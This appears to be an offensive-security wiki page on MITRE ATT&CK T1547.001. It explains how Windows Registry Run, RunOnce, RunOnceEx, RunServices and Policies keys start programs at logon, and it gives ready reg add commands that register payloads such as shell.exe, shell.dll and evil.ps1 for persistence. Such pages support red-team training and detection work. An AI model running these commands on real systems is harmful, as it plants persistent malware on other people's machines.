---
description: >-
  MITRE ATT&CK™ Boot or Logon Autostart Execution: Registry Run Keys / Startup
  Folder - Technique T1547.001
---

# Run Keys Persistence

## Theory&#x20;

A classic and widely used persistence technique involves adding an entry to the **Registry "Run" keys**, causing a specified program to execute automatically when a user logs in. This ensures that the attacker’s payload is launched every time the system starts or a user session begins.

#### **Trigger Condition:**

The execution of the referenced program occurs when a user logs in to Windows. The specific privilege level of the executed process depends on the security context of the affected user account:

* If added under **`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`**, the program runs in the context of the current user.
* If added under **`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`**, the program executes for all users on the system, requiring Administrator privileges to modify.

This technique is simple, effective, and often overlooked, making it a popular choice for persistence in both malware and post-exploitation scenarios.

## Practice

{% hint style="success" %}
Registry entries under `HKU/HKCU` will only apply to the user.\
Registry entries under `HKLM` will apply to everyone
{% endhint %}

{% hint style="info" %}
**Run/RunServices** keys will run every time a user logs in.

**RunOnce/RunServicesOnce** will clears the registry key as soon as it run.
{% endhint %}

{% tabs %}
{% tab title="Run/RunOnce/RunOnceEx" %}
You can force a user to execute a program on logon via the **Run** and **RunOnce** and **RunOnceEx** registry keys. You can use the following registry entries to specify applications to run at logon:

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`

The **RunOnceEx** key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx.

{% hint style="info" %}
RunOnceEx only executes from HKEY\_LOCAL\_MACHINE (HKLM)

RunOnceEx clears the registry key on completion of the command.
{% endhint %}

```bash
#Run/RunOnce
## Add key for current user
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v PeMalware /t REG_SZ /d "C:\Users\user1\shell.exe"
## Add key for computer (all users)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v PeMalware /t REG_SZ /d "C:\Users\user1\shell.exe"

#RunOnceEx
#Add key for current user - Execute command / PE
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v PeMalware /t REG_SZ /d "C:\tmp\shell.exe"
#Add key for computer (all users) - Execute DLL
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v DLLMalware /t REG_SZ /d "C:\tmp\shell.dll"
```
{% endtab %}

{% tab title="RunServices/RunServicesOnce " %}
The following Registry keys can control automatic startup of services during boot:

* `HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`

```powershell
#Add key for current user - Execute command / PE
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Pwned /t REG_SZ /d "C:\tmp\Pwned.exe"

#Add key for computer (all users) - Execute command / PE
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Pwned /t REG_SZ /d "C:\tmp\Pwned.exe"
```
{% endtab %}

{% tab title="Policies" %}
We can use policy settings to specify startup programs with following registry keys

* HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
* HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

```powershell
#Add key for current user - Execute command / PE
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v Pwned /t REG_SZ /d "C:\tmp\Pwned.exe"

#Add key for computer (all users) - Execute command
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v Pwned /t REG_SZ /d "powershell.exe C:\tmp\evil.ps1"
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://attack.mitre.org/techniques/T1547/001/" %}
